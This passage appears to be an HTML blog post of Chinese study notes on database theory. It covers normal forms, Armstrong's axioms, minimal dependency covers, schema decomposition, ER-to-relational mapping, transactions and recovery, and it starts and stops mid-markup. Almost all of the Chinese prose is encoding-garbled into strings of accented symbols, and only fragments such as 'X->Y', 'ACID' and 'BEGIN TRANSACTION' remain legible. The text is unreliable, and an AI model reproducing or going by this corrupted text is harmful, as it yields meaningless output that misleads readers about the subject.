‰∏çÂ±û‰∫é BCNF ÂÖ≥Á≥ª„ÄÇ</p><p><img src="/2021/05/03/Database-review/20190629193928110.png" alt="img"></p><p><strong>ÁªìËÆ∫Ôºö</strong></p><ol><li>‰ªª‰Ωï‰∏Ä‰∏™‰∫åÁõÆÂÖ≥Á≥ªÈÉΩÊòØBCNF</li><li>ÂÖ≥Á≥ªÊ®°ÂºèR‰∏≠Â±ûÊÄßÂÖ®ÈÉ®ÊòØ‰∏ªÂ±ûÊÄßÔºåÂàôRÁöÑÊúÄ‰ΩéËåÉÂºèÂøÖÂÆöÊòØ Ëá≥Â∞ëËææÂà∞Á¨¨‰∏âËåÉÂºè</li></ol><h2 id="4-5-ArmstrongÂÖ¨ÁêÜÁ≥ªÁªü"><a href="#4-5-ArmstrongÂÖ¨ÁêÜÁ≥ªÁªü" class="headerlink" title="4.5 ArmstrongÂÖ¨ÁêÜÁ≥ªÁªü"></a>4.5 ArmstrongÂÖ¨ÁêÜÁ≥ªÁªü</h2><h3 id="Áã¨Á´ãÊé®ÁêÜËßÑÂàô"><a href="#Áã¨Á´ãÊé®ÁêÜËßÑÂàô" class="headerlink" title="Áã¨Á´ãÊé®ÁêÜËßÑÂàô"></a>Áã¨Á´ãÊé®ÁêÜËßÑÂàô</h3><p><strong>Ëá™ÂèçÂæã</strong></p><p><img src="/2021/05/03/Database-review/image-20210506230123348.png" alt="image-20210506230123348"></p><p><strong>Â¢ûÂπøÂæã</strong></p><p><img src="/2021/05/03/Database-review/image-20210506230337823.png" alt="image-20210506230337823"></p><h3 id="‰º†ÈÄíÂæã"><a href="#‰º†ÈÄíÂæã" class="headerlink" title="‰º†ÈÄíÂæã"></a>‰º†ÈÄíÂæã</h3><p><img src="/2021/05/03/Database-review/image-20210506230430664.png" alt="image-20210506230430664"></p><ol><li>YÂ±û‰∫éX,X-&gt;Y</li><li>ZÂ±û‰∫éU,X-&gt;Y,ÊúâXZ-&gt;YZ</li><li>X-&gt;YÂíåY-&gt;Z,ÊúâX-&gt;Z</li></ol><p>Âá†‰∏™Êé®ËÆ∫</p><ol><li>X-&gt;Y,X-&gt;Z Êúâ X-&gt;YZ</li><li>X-&gt;Y ZÂ±û‰∫éY ÊúâX-&gt;Z</li><li>X-&gt;Y,WY-&gt;Z,ÊúâXW-&gt;Z</li></ol><h3 id="Â±ûÊÄßÈõÜÁöÑÈó≠ÂåÖ"><a href="#Â±ûÊÄßÈõÜÁöÑÈó≠ÂåÖ" class="headerlink" title="Â±ûÊÄßÈõÜÁöÑÈó≠ÂåÖ"></a>Â±ûÊÄßÈõÜÁöÑÈó≠ÂåÖ</h3><p><img src="/2021/05/03/Database-review/image-20210506233112332.png" alt="image-20210506233112332"></p><h2 id="4-6-ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ"><a href="#4-6-ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ" class="headerlink" title="4.6 ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ"></a>4.6 ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ</h2><h3 id="ÂáΩÊï∞‰æùËµñÈõÜÁ≠â‰ª∑"><a href="#ÂáΩÊï∞‰æùËµñÈõÜÁ≠â‰ª∑" class="headerlink" title="ÂáΩÊï∞‰æùËµñÈõÜÁ≠â‰ª∑"></a>ÂáΩÊï∞‰æùËµñÈõÜÁ≠â‰ª∑</h3><p>ËÆæFÂíåGÊòØÂáΩÊï∞‰æùËµñÈõÜÔºåËã•FÈó≠ÂåÖ=GÈó≠ÂåÖÔºåÂàôFÂíåGÁ≠â‰ª∑„ÄÇ</p><p><strong>FÁöÑÈó≠ÂåÖ=GÁöÑÈó≠ÂåÖÁöÑÂÖÖÂàÜÂøÖË¶ÅÊù°‰ª∂ÊòØFÊòØGÈó≠ÂåÖÁöÑÂ≠êÈõÜÔºåGÊòØFÈó≠ÂåÖÁöÑÂ≠êÈõÜ„ÄÇ</strong></p><p>egÔºö</p><p><img src="/2021/05/03/Database-review/image-20210507153146293.png" alt="image-20210507153146293"></p><h3 id="ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ"><a href="#ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ" class="headerlink" title="ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ"></a><strong>ÊúÄÂ∞èÂáΩÊï∞‰æùËµñÈõÜ</strong></h3><p>ÂÆö‰πâÈúÄË¶ÅÊª°Ë∂≥‰∏â‰∏™Êù°‰ª∂Ôºö</p><ol><li>Âè≥ÈÉ®ÈÉΩÊòØÂçïÂ±ûÊÄß</li><li>F-A‰πãÂêéËÆ∞‰∏∫F1Ôºå‰∏îF1‰∏ç‰∏éFÁ≠â‰ª∑</li><li>ÂØπ‰∫éÂ§ö‰∏™Â±ûÊÄßÂÜ≥ÂÆöÔºåË¶ÅÂà§Êñ≠ÊØè‰∏ÄÂ±ûÊÄß‰∏çÊòØÂÜó‰ΩôÁöÑ„ÄÇ</li></ol><h3 id="FÁöÑÊúÄÂ∞è‰æùËµñÈõÜÁöÑÁÆóÊ≥ï"><a href="#FÁöÑÊúÄÂ∞è‰æùËµñÈõÜÁöÑÁÆóÊ≥ï" class="headerlink" title="FÁöÑÊúÄÂ∞è‰æùËµñÈõÜÁöÑÁÆóÊ≥ï"></a><strong>FÁöÑÊúÄÂ∞è‰æùËµñÈõÜÁöÑÁÆóÊ≥ï</strong></h3><p><img src="/2021/05/03/Database-review/image-20210507154804795.png" alt="image-20210507154804795"></p><p>egÔºö</p><p><strong>ÂáΩÊï∞‰æùËµñÈõÜFÁöÑÊúÄÂ∞èË¶ÜÁõñÂèØËÉΩÊúâÂ§ö‰∏™</strong></p><p><img src="/2021/05/03/Database-review/image-20210507155107652.png" alt="image-20210507155107652"></p><p><img src="/2021/05/03/Database-review/image-20210507155154422.png" alt="image-20210507155154422"></p><p><img src="/2021/05/03/Database-review/image-20210507155340685.png" alt="image-20210507155340685"></p><p><img src="/2021/05/03/Database-review/image-20210507155425864.png" alt="image-20210507155425864"></p><h2 id="4-7-Á†ÅÂÄºÁêÜËÆ∫"><a href="#4-7-Á†ÅÂÄºÁêÜËÆ∫" class="headerlink" title="4.7 Á†ÅÂÄºÁêÜËÆ∫"></a>4.7 Á†ÅÂÄºÁêÜËÆ∫</h2><p><img src="/2021/05/03/Database-review/image-20210507160245915.png" alt="image-20210507160245915"></p><p><img src="/2021/05/03/Database-review/image-20210507160155053.png" alt="image-20210507160155053"></p><p><strong>Â§öÂ±ûÊÄß‰æùËµñÈõÜÂÄôÈÄâÂÖ≥ÈîÆÂ≠óÊ±ÇËß£ÁÆóÊ≥ï</strong></p><p><img src="/2021/05/03/Database-review/image-20210507161022110.png" alt="image-20210507161022110"></p><p><img src="/2021/05/03/Database-review/image-20210507161055600.png" alt="image-20210507161055600"></p><p><img src="/2021/05/03/Database-review/image-20210507161117962.png" alt="image-20210507161117962"></p><p>Ê≠§Â§ñËøòÊúâÂõæËÆ∫ÁöÑÊñπÊ≥ï„ÄÇ</p><p>ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØ‰∏§ÁÇπ</p><ol><li>ÂÖàÊâæXÔºàLÁ±ªÂíåNÁ±ªÔºâÂíåYÔºàRÁ±ªÂíåLRÁ±ªÔºâÔºåÁîªÂ•ΩÂÖ•Â∫¶ÂíåÂá∫Â∫¶„ÄÇ</li><li>ÁÑ∂ÂêéÈÄê‰∏™Â¢ûÂä†ÔºåÁõ¥Ëá≥ÊâæÂà∞ÂõûË∑Ø„ÄÇ</li></ol><h2 id="4-8-Ê®°ÂºèÂàÜËß£"><a href="#4-8-Ê®°ÂºèÂàÜËß£" class="headerlink" title="4.8 Ê®°ÂºèÂàÜËß£"></a>4.8 Ê®°ÂºèÂàÜËß£</h2><p>Ê≤°Â§™ÁúãÊáÇ Á≠âÂ§ç‰π†ÂÆåÂÜçÁúã</p><p><strong>Âà§Êñ≠ÂàÜËß£ÁöÑÊó†ÊçüËøûÊé•ÊÄß</strong></p><p>Áõ¥Êé•Áúã‰æãÂ≠êÂêß</p><p><img src="/2021/05/03/Database-review/image-20210507172917369.png" alt="image-20210507172917369"></p><h2 id="4-9-ÂáΩÊï∞‰æùËµñ‰øùÊåÅÊÄßÂíåÊ®°ÂºèÂàÜËß£ÁÆóÊ≥ï"><a href="#4-9-ÂáΩÊï∞‰æùËµñ‰øùÊåÅÊÄßÂíåÊ®°ÂºèÂàÜËß£ÁÆóÊ≥ï" class="headerlink" title="4.9 ÂáΩÊï∞‰æùËµñ‰øùÊåÅÊÄßÂíåÊ®°ÂºèÂàÜËß£ÁÆóÊ≥ï"></a>4.9 ÂáΩÊï∞‰æùËµñ‰øùÊåÅÊÄßÂíåÊ®°ÂºèÂàÜËß£ÁÆóÊ≥ï</h2><h3 id="ÂÖ≥Á≥ªÊ®°ÂºèÁöÑÂàÜËß£ÁÆóÊ≥ï"><a href="#ÂÖ≥Á≥ªÊ®°ÂºèÁöÑÂàÜËß£ÁÆóÊ≥ï" class="headerlink" title="ÂÖ≥Á≥ªÊ®°ÂºèÁöÑÂàÜËß£ÁÆóÊ≥ï"></a>ÂÖ≥Á≥ªÊ®°ÂºèÁöÑÂàÜËß£ÁÆóÊ≥ï</h3><p><strong>1.ËΩ¨Êç¢‰∏∫3NFÁöÑ‰øùÊåÅÂáΩÊï∞‰æùËµñÁöÑÂàÜËß£</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212116352.png" alt="image-20210507212116352"></p><p><img src="/2021/05/03/Database-review/image-20210507212123809.png" alt="image-20210507212123809"></p><p><strong>2.ÂÖ∑Êúâ‰æùËµñ‰øùÊåÅÂíåËøûÊé•‰∏çÂ§±ÁúüÁöÑÂàÜËß£</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212321618.png" alt="image-20210507212321618"></p><p><strong>3.ÁªìÊûú‰∏∫BCNFÁöÑËøû‰∏çÂ§±ÁúüÂàÜËß£</strong></p><p><img src="/2021/05/03/Database-review/image-20210507212741288.png" alt="image-20210507212741288"></p><h1 id="0x05-Êï∞ÊçÆÂ∫ìËÆæËÆ°"><a href="#0x05-Êï∞ÊçÆÂ∫ìËÆæËÆ°" class="headerlink" title="0x05 Êï∞ÊçÆÂ∫ìËÆæËÆ°"></a>0x05 Êï∞ÊçÆÂ∫ìËÆæËÆ°</h1><h2 id="5-1-Êï∞ÊçÆÂ∫ìËÆæËÆ°Ê¶ÇËø∞"><a href="#5-1-Êï∞ÊçÆÂ∫ìËÆæËÆ°Ê¶ÇËø∞" class="headerlink" title="5.1 Êï∞ÊçÆÂ∫ìËÆæËÆ°Ê¶ÇËø∞"></a>5.1 Êï∞ÊçÆÂ∫ìËÆæËÆ°Ê¶ÇËø∞</h2><p><strong>Êï∞ÊçÆÂ∫ìËÆæËÆ°</strong>ÔºöÂØπ‰∫é‰∏Ä‰∏™ÁªôÂÆöÁöÑÂ∫îÁî®ÁéØÂ¢ÉÔºåÊûÑÈÄ†ÊúÄ‰ºòÁöÑÊï∞ÊçÆÂ∫ìÊ®°ÂºèÔºåÂª∫Á´ãÊï∞ÊçÆÂ∫ìÂèäÂÖ∂Â∫îÁî®Á≥ªÁªüÔºå‰Ωø‰πãËÉΩÊúâÊïàÂú∞Â≠òÂÇ®Êï∞ÊçÆÔºåÊª°Ë∂≥ÂêÑÁßçÁî®Êà∑ÁöÑ‰ø°ÊÅØÈúÄÊ±ÇÔºàÊï∞ÊçÆÂ∫ìÂÜÖÂÆπÂèäÁªìÊûÑÁöÑË¶ÅÊ±ÇÔºåÈùôÊÄÅÔºâ‰∏éÂ§ÑÁêÜÈúÄÊ±ÇÔºàÊï∞ÊçÆÂ∫ìË¶ÅËøõË°åÁöÑÊï∞ÊçÆÂ§ÑÁêÜÔºåÂä®ÊÄÅÔºâ„ÄÇ</p><p><strong>ËÆæËÆ°ÊñπÊ≥ï</strong></p><ol><li>Áõ¥ËßÇËÆæËÆ°Ê≥ï</li><li>ËßÑËåÉËÆæËÆ°Ê≥ïÔºàÂÆû‰ΩìËÅîÁ≥ª„ÄÅÂü∫‰∫é3NF„ÄÅÂü∫‰∫éËßÜÂõæÊ¶ÇÂøµÔºâ</li><li>ËÆ°ÁÆóÊú∫ËæÖÂä©ËÆæËÆ°Ê≥ï</li><li>Ëá™Âä®ÂåñËÆæËÆ°Ê≥ï</li></ol><h2 id="5-2-ÈúÄÊ±ÇÂàÜÊûê"><a href="#5-2-ÈúÄÊ±ÇÂàÜÊûê" class="headerlink" title="5.2 ÈúÄÊ±ÇÂàÜÊûê"></a>5.2 ÈúÄÊ±ÇÂàÜÊûê</h2><p><strong>ÂàÜÊûêÈáçÁÇπ</strong>Ôºö‰ø°ÊÅØË¶ÅÊ±ÇÔºàDB‰∏≠ÈúÄÂ≠òÂÇ®ÁöÑÊï∞ÊçÆÔºâ„ÄÅÂ§ÑÁêÜË¶ÅÊ±ÇÔºàÁî®Êà∑Ë¶ÅÊ±ÇÁöÑÂ§ÑÁêÜÂäüËÉΩ„ÄÅÂ§ÑÁêÜÂìçÂ∫îÊó∂Èó¥ÁöÑË¶ÅÊ±ÇÔºâ„ÄÅÂÆâÂÖ®ÊÄß‰∏éÂÆåÊï¥ÊÄßË¶ÅÊ±Ç</p><p><strong>Ë∞ÉÊü•ÈúÄÊ±ÇÊ≠•È™§</strong>Ôºö </p><ol><li>ÂàÜÊûêÁî®Êà∑Ê¥ªÂä®Ôºå‰∫ßÁîü‰∏öÂä°ÊµÅÁ®ãÂõæ</li><li>Á°ÆÂÆöÁ≥ªÁªüËåÉÂõ¥Ôºå‰∫ßÁîü‰∏öÂä°ËåÉÂõ¥Âõæ</li><li>ÂàÜÊûêÁî®Êà∑Ê¥ªÂä®ÂèäÊâÄËÆæËÆ°ÁöÑÊï∞ÊçÆÔºå‰∫ßÁîüÊï∞ÊçÆÊµÅÂõæÔºàÂ§ñÈÉ®È°π„ÄÅÊï∞ÊçÆÂä†Â∑•„ÄÅÊï∞ÊçÆÂ≠òÂÇ®„ÄÅÊï∞ÊçÆÊµÅÔºâ</li><li>ÂàÜÊûêÁ≥ªÁªüÊï∞ÊçÆÔºå‰∫ßÁîüÊï∞ÊçÆÂ≠óÂÖ∏</li></ol><p><strong>Êï∞ÊçÆÂ≠óÂÖ∏</strong>ÔºöÂÖ≥‰∫éÊï∞ÊçÆÂ∫ì‰∏≠Êï∞ÊçÆÁöÑÊèèËø∞ÔºåÂÖÉÊï∞ÊçÆÔºåËÄå‰∏çÊòØÊï∞ÊçÆÊú¨Ë∫´ </p><p>Êï∞ÊçÆÈ°πÔºöÊòØ‰∏çÂèØÂÜçÂàÜÁöÑÊï∞ÊçÆÂçï‰Ωç </p><p>Êï∞ÊçÆÁªìÊûÑÔºöÂèçÊò†Êï∞ÊçÆ‰πãÈó¥ÁöÑÁªÑÂêàÂÖ≥Á≥ª </p><p>Êï∞ÊçÆÊµÅÔºöÊï∞ÊçÆÁªìÊûÑÂú®Á≥ªÁªüÂÜÖ‰º†ËæìÁöÑÈÄîÂæÑ </p><p>Êï∞ÊçÆÂ≠òÂÇ®ÔºöÊï∞ÊçÆÁªìÊûÑÂÅúÁïôÊàñ‰øùÂ≠òÁöÑÂú∞ÊñπÔºå‰πüÊòØÊï∞ÊçÆÊµÅÁöÑÊù•Ê∫êÂíåÂéªÂêë‰πã‰∏Ä </p><p>Â§ÑÁêÜËøáÁ®ãÔºöÊèèËø∞Â§ÑÁêÜËøáÁ®ãÁöÑËØ¥ÊòéÊÄß‰ø°ÊÅØ </p><h2 id="5-3-Êï∞ÊçÆÂ∫ìÊ¶ÇÂøµÁªìÊûÑËÆæËÆ°"><a href="#5-3-Êï∞ÊçÆÂ∫ìÊ¶ÇÂøµÁªìÊûÑËÆæËÆ°" class="headerlink" title="5.3 Êï∞ÊçÆÂ∫ìÊ¶ÇÂøµÁªìÊûÑËÆæËÆ°"></a>5.3 Êï∞ÊçÆÂ∫ìÊ¶ÇÂøµÁªìÊûÑËÆæËÆ°</h2><p><strong>ÂàÜÁ±ª</strong>ÔºöËá™È°∂Âêë‰∏ãÔºàÈõÜ‰∏≠Ê®°ÂºèËÆæËÆ°Ôºâ„ÄÅËá™Â∫ïÂêë‰∏äÔºàËßÜÂõæÈõÜÊàêÊ≥ïÔºâ„ÄÅÊ∑∑ÂêàÁ≠ñÁï•ÔºàËá™Â∫ïÂêë‰∏ä „ÄÅÂíåËá™È°∂Âêë‰∏ãÁõ∏ÁªìÂêàÔºâ„ÄÅÈÄêÊ≠•Êâ©Âº†ÔºàÁî±ÂÜÖÂêëÂ§ñÊ≥ïÔºâ</p><p><strong>Â±ÄÈÉ®ËßÜÂõæËÆæËÆ°</strong>ÔºöÈÄöÂ∏∏‰ª•‰∏≠Â±ÇÊï∞ÊçÆÊµÅÂõæ‰Ωú‰∏∫ËÆæËÆ°ÂàÜE-RÂõæÁöÑ‰æùÊçÆÔºàÊâæÂÆû‰Ωì„ÄÅÊâæÂ±ûÊÄß„ÄÅÊâæËÅîÁ≥ªÂíåÁ±ªÂûãÔºâ </p><p><strong>ÈõÜÊàêÂÖ®Â±ÄËßÜÂõæ</strong>ÔºöÊ®°Âºè‰πãÈó¥ÁöÑÂØπÂ∫îÂíåÂÜ≤Á™ÅÂåÖÊã¨ÔºöÂ±ûÊÄßÂÜ≤Á™Å ÔºàÂ±ûÊÄßÂüüÂÜ≤Á™Å„ÄÅÂèñÂÄºÂçï‰ΩçÂÜ≤Á™ÅÔºâ„ÄÅÂëΩÂêçÂÜ≤Á™ÅÔºàÂêåÂêçÂºÇ‰πâ„ÄÅÂºÇÂêçÂêå‰πâÔºâ„ÄÅÁªìÊûÑÂÜ≤Á™Å ÔºåÂèØ‰ª•‰øÆÊîπËßÜÂõæ‰ΩøÂæóÁõ∏‰∫í‰∏ÄËá¥ÊàñËÄÖÂêàÂπ∂ËßÜÂõæÊàñËÄÖÈáçÊûÑ„ÄÇ</p><h2 id="5-4-Êï∞ÊçÆÂ∫ìÈÄªËæëÁªìÊûÑËÆæËÆ°"><a href="#5-4-Êï∞ÊçÆÂ∫ìÈÄªËæëÁªìÊûÑËÆæËÆ°" class="headerlink" title="5.4 Êï∞ÊçÆÂ∫ìÈÄªËæëÁªìÊûÑËÆæËÆ°"></a>5.4 Êï∞ÊçÆÂ∫ìÈÄªËæëÁªìÊûÑËÆæËÆ°</h2><p>E-RÂõæËΩ¨Êç¢‰∏∫ÂÖ≥Á≥ªÊ®°ÂºèÔºåÂÆûË¥®ÊòØÂ∞ÜÂÆû‰ΩìÂíåËÅîÁ≥ªËΩ¨‰∏∫ÂÖ≥Á≥ªÊ®°Âºè„ÄÇ </p><h3 id="‰∏ÄÂØπ‰∏Ä"><a href="#‰∏ÄÂØπ‰∏Ä" class="headerlink" title="‰∏ÄÂØπ‰∏Ä"></a><strong>‰∏ÄÂØπ‰∏Ä</strong></h3><ul><li><p>ËΩ¨Êç¢‰∏∫Êñ∞ÂÖ≥Á≥ªÔºåÊØè‰∏™ÂÆû‰ΩìÁöÑÁ†ÅÂùáÊòØËØ•ÂÖ≥Á≥ªÁöÑÂÄôÈÄâÁ†Å„ÄÇ </p></li><li><p>‰∏é‰ªªÊÑè‰∏ÄÁ´ØÊ®°ÂºèÂêàÂπ∂„ÄÇÂú®ËØ•ÂÖ≥Á≥ªÊ®°Âºè‰∏≠Âä†ÂÖ•Âè¶‰∏ÄÂÖ≥Á≥ªÁöÑÁ†ÅÂíåËÅîÁ≥ªÁöÑÂ±ûÊÄßÔºåËØ•ÂÖ≥Á≥ªÁöÑÁ†Å‰∏çÂèò„ÄÇ </p></li></ul><h3 id="‰∏ÄÂØπÂ§ö-Â§öÂØπ‰∏Ä"><a href="#‰∏ÄÂØπÂ§ö-Â§öÂØπ‰∏Ä" class="headerlink" title="‰∏ÄÂØπÂ§ö/Â§öÂØπ‰∏Ä"></a><strong>‰∏ÄÂØπÂ§ö/Â§öÂØπ‰∏Ä</strong></h3><ul><li>ËΩ¨Êç¢‰∏∫Êñ∞ÂÖ≥Á≥ª„ÄÇ ‰∏éËØ•ËÅîÁ≥ªÁõ∏ËøûÁöÑÂêÑÂÆû‰ΩìÁöÑÁ†Å‰ª•ÂèäËÅîÁ≥ªÊú¨Ë∫´ÁöÑÂ±ûÊÄßÊûÑÊàêÊñ∞ÂÖ≥Á≥ªÁöÑÂ±ûÊÄßÔºåËØ•ÂÖ≥Á≥ªÁöÑÁ†ÅÊòØnÁ´ØÂÖ≥Á≥ªÊ®°ÂºèÁöÑÁ†Å</li><li>‰∏énÁ´ØÊ®°ÂºèÂêàÂπ∂„ÄÇ<strong>Âú®nÁ´ØÂÖ≥Á≥ªÊ®°Âºè‰∏≠Âä†ÂÖ•1Á´ØÂÖ≥Á≥ªÊ®°ÂºèÁöÑÁ†ÅÂíåËÅîÁ≥ªÁöÑÂ±ûÊÄßÔºåÂÖ≥Á≥ªÁöÑÁ†Å‰ªç‰∏∫nÁ´ØÂÖ≥Á≥ªÁöÑÁ†Å</strong>„ÄÇ </li></ul><h3 id="Â§öÂØπÂ§ö"><a href="#Â§öÂØπÂ§ö" class="headerlink" title="Â§öÂØπÂ§ö"></a><strong>Â§öÂØπÂ§ö</strong></h3><ul><li>‰∏éËØ•ËÅîÁ≥ªÁõ∏ËøûÁöÑÂêÑÂÆû‰ΩìÁöÑÁ†Å‰ª•ÂèäËÅîÁ≥ªÊú¨Ë∫´ÁöÑÂ±ûÊÄßÊûÑÊàêÊñ∞ÂÖ≥Á≥ªÁöÑÂ±ûÊÄßÔºåËØ•ÂÖ≥Á≥ªÁöÑÁ†ÅÊòØ‰∏§Á´ØÂÖ≥Á≥ªÊ®°ÂºèÁ†ÅÁöÑÁªÑÂêà„ÄÇ </li></ul><h1 id="0x06-Êï∞ÊçÆÂ∫ì‰øùÊä§"><a href="#0x06-Êï∞ÊçÆÂ∫ì‰øùÊä§" class="headerlink" title="0x06 Êï∞ÊçÆÂ∫ì‰øùÊä§"></a>0x06 Êï∞ÊçÆÂ∫ì‰øùÊä§</h1><h2 id="6-1-Êï∞ÊçÆÂ∫ì‰øùÊä§Âíå‰∫ãÂä°"><a href="#6-1-Êï∞ÊçÆÂ∫ì‰øùÊä§Âíå‰∫ãÂä°" class="headerlink" title="6.1 Êï∞ÊçÆÂ∫ì‰øùÊä§Âíå‰∫ãÂä°"></a>6.1 Êï∞ÊçÆÂ∫ì‰øùÊä§Âíå‰∫ãÂä°</h2><p>Êï∞ÊçÆÂ∫ìÈúÄË¶Å‰øùÊä§ÔºåÊï∞ÊçÆÂ∫ì‰øùÊä§ÂåÖÊã¨Âõõ‰∏™‰∏ªË¶ÅÂäüËÉΩ:Â§á‰ªΩÂíåÊÅ¢Â§ç„ÄÅÂπ∂ÂèëÊéßÂà∂„ÄÅÂÆâÂÖ®ÊÄßÊéßÂà∂ÂíåÂÆåÊï¥ÊÄßÊéßÂà∂„ÄÇ</p><h3 id="Êï∞ÊçÆ‰∫ãÂä°Ê¶ÇÂøµ"><a href="#Êï∞ÊçÆ‰∫ãÂä°Ê¶ÇÂøµ" class="headerlink" title="Êï∞ÊçÆ‰∫ãÂä°Ê¶ÇÂøµ"></a>Êï∞ÊçÆ‰∫ãÂä°Ê¶ÇÂøµ</h3><p>ÊòØ‰∏Ä‰∏™‰∏çÂèØÂàÜÂâ≤ÁöÑÊìç‰ΩúÂ∫èÂàóÔºåËØ•Êìç‰ΩúÂ∫èÂàóË¶Å‰πàÂÖ®ÂÅöÔºåË¶Å‰πàÂÖ®‰∏çÂÅö„ÄÇ</p><p>‰∫ãÂä°ÈÄöÂ∏∏ÊòØ‰ª•BEGIN TRANSACTIONÂºÄÂßãÔºå‰ª•COMMITÊàñROLLBACKÁªìÊùü„ÄÇCOMMITË°®Á§∫Êèê‰∫§ÔºåROLLBACKË°®Á§∫ÂõûÊªöÔºåÂú®‰∫ãÂä°ËøêË°åÁöÑËøáÁ®ã‰∏≠ÂèëÁîüÊüêÁßçÊïÖÈöú‰∫ãÂä°‰∏çËÉΩÁªßÁª≠ÊâßË°åÔºåÁ≥ªÁªüÂ∞±‰ºöÂ∞Ü‰∫ãÂä°ÂØπÊï∞ÊçÆÂ∫ìÁöÑÂ∑≤ÂÆåÊàêÊìç‰ΩúÂÖ®ÈÉ®Êí§ÈîÄÔºå‰ªéËÄåÂõûÊªöÂà∞‰∫ãÂä°ÂºÄÂßãÊó∂ÁöÑÁä∂ÊÄÅ„ÄÇ</p><h3 id="‰∫ãÂä°ÊâßË°åËøáÁ®ãÁöÑ‰∫îÁßçÁä∂ÊÄÅ"><a href="#‰∫ãÂä°ÊâßË°åËøáÁ®ãÁöÑ‰∫îÁßçÁä∂ÊÄÅ" class="headerlink" title="‰∫ãÂä°ÊâßË°åËøáÁ®ãÁöÑ‰∫îÁßçÁä∂ÊÄÅ"></a>‰∫ãÂä°ÊâßË°åËøáÁ®ãÁöÑ‰∫îÁßçÁä∂ÊÄÅ</h3><ol><li>Ê¥ªÂä®Áä∂ÊÄÅ</li><li>ÈÉ®ÂàÜÊèê‰∫§Áä∂ÊÄÅ</li><li>Êèê‰∫§Áä∂ÊÄÅ</li><li>Â§±Ë¥•Áä∂ÊÄÅ</li><li>‰∏≠Ê≠¢Áä∂ÊÄÅ</li></ol><p><img src="/2021/05/03/Database-review/image-20210508123313748.png" alt="image-20210508123313748"></p><h3 id="‰∫ãÂä°ACIDÁâπÊÄß"><a href="#‰∫ãÂä°ACIDÁâπÊÄß" class="headerlink" title="‰∫ãÂä°ACIDÁâπÊÄß"></a>‰∫ãÂä°ACIDÁâπÊÄß</h3><p>1.ÂéüÂ≠êÊÄßÔºö‰∫ãÂä°ÊòØ‰∏çÂèØÂàÜÂâ≤ÁöÑÂ∑•‰ΩúÂçï‰Ωç„ÄÇ</p><p>2.‰∏ÄËá¥ÊÄßÔºö‰∫ãÂä°Êèê‰∫§ÂêéÔºåÊï∞ÊçÆÂ∫ì‰ªé-‰∏™‰∏ÄËá¥ÊÄßÁä∂ÊÄÅÂèòÂà∞Âè¶‰∏Ä‰∏™‰∏ÄËá¥ÊÄßÁä∂ÊÄÅ„ÄÇ</p><p>3.ÈöîÁ¶ªÊÄßÔºöÂú®‰∫ãÂä°ÂÆåÊàê‰πãÂâçÔºåÂÆÉÂØπÊï∞ÊçÆÂ∫ì‰∫ßÁîüÁöÑÁªìÊûú‰∏çËÉΩË¢´ÂÖ∂ÂÆÉ‰∫ãÂä°ÂºïÁî®„ÄÇ</p><p>4.ÊåÅÁª≠ÊÄßÔºö‰∏ÄÊó¶‰∫ãÂä°ÊâßË°åÊàêÂäü(Êèê‰∫§)ÔºåÂÖ∂ÂØπÊï∞ÊçÆ‰∫ßÁîüÁöÑÊïàÊûúÊ∞∏‰πÖÊúâÊïà„ÄÇ</p><h2 id="6-2-Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÊäÄÊúØ"><a href="#6-2-Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÊäÄÊúØ" class="headerlink" title="6.2 Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÊäÄÊúØ"></a>6.2 Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÊäÄÊúØ</h2><h3 id="Êï∞ÊçÆÂ∫ìÊïÖÈöú"><a href="#Êï∞ÊçÆÂ∫ìÊïÖÈöú" class="headerlink" title="Êï∞ÊçÆÂ∫ìÊïÖÈöú"></a>Êï∞ÊçÆÂ∫ìÊïÖÈöú</h3><p>1.‰∫ãÂä°ÂÜÖÈÉ®ÊïÖÈöúÔºöÂ¶ÇÊûúÂΩìÂâç‰∫ãÂä°Âú®ÊâßË°åÂÜÖÈÉ®Êìç‰ΩúÁöÑÊó∂ÂÄôÂèëÁîüÊïÖÈöúÔºåÂ∞±ÊòØ‰∫ãÂä°ÂÜÖÈÉ®ÊïÖÈöúÔºåÊâßË°åUNDOÊìç‰Ωú„ÄÇ</p><p>2.Á≥ªÁªüÊïÖÈöúÔºöÈÄ†ÊàêÁ≥ªÁªüÂÅúÊ≠¢ËøêËΩ¨Âπ∂Ë¶ÅÊ±ÇÁ≥ªÁªüÈáçÊñ∞ÂêØÂä®ÁöÑ‰∏ÄÁ±ªÊïÖÈöú„ÄÇ</p><p>3.‰ªãË¥®ÊïÖÈöúÔºöÂØºËá¥Êï∞ÊçÆÂ∫ìÁöÑÊï∞ÊçÆÈÉ®ÂàÜ‰∏¢Â§±ÊàñËÄÖÂÖ®ÈÉ®‰∏¢Â§±ÁöÑ‰∏ÄÁ±ªÊïÖÈöú„ÄÇ</p><h3 id="Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÂéüÁêÜÂíåÊäÄÊúØ"><a href="#Êï∞ÊçÆÂ∫ìÊÅ¢Â§çÂéüÁêÜÂíåÊäÄÊúØ" class="headerlink" 